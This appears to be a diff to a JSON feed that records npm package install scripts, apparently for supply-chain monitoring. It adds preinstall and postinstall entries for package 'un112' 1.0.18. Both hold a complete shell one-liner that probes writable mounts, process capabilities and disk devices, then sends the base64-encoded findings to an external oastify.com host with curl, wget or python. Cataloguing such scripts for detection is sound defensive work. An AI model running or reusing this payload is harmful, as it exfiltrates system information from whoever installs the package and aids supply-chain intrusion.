@@ -1,5 +1,21 @@
 [
   {
+    "packageName": "un112",
+    "version": "1.0.18",
+    "scriptType": "postinstall",
+    "scriptContent": "sh -c 'OUT=\"\"; for m in $(grep \" rw\" /proc/mounts | awk \"{print \\$2}\"); do touch \"$m/.t\" 2>/dev/null && OUT=\"$OUT$m:W \"; done; CAP=$(cat /proc/self/status | grep CapEff); DEVS=$(ls /dev/ | grep -E \"sd|nvme|vd\" | tr \"\\n\" \" \"); DATA=$(echo \"Caps:$CAP Paths:$OUT Devs:$DEVS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA || python -c \"import urllib; urllib.urlopen(\\\"http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA\\\")\") 2>/dev/null'",
+    "previousVersion": "1.0.17",
+    "timestamp": "2026-01-22T11:17:05.996Z"
+  },
+  {
+    "packageName": "un112",
+    "version": "1.0.18",
+    "scriptType": "preinstall",
+    "scriptContent": "sh -c 'OUT=\"\"; for m in $(grep \" rw\" /proc/mounts | awk \"{print \\$2}\"); do touch \"$m/.t\" 2>/dev/null && OUT=\"$OUT$m:W \"; done; CAP=$(cat /proc/self/status | grep CapEff); DEVS=$(ls /dev/ | grep -E \"sd|nvme|vd\" | tr \"\\n\" \" \"); DATA=$(echo \"Caps:$CAP Paths:$OUT Devs:$DEVS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA || python -c \"import urllib; urllib.urlopen(\\\"http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?d=$DATA\\\")\") 2>/dev/null'",
+    "previousVersion": "1.0.17",
+    "timestamp": "2026-01-22T11:17:05.994Z"
+  },
+  {
     "packageName": "astn",
     "version": "1.20.5",
     "scriptType": "postinstall",
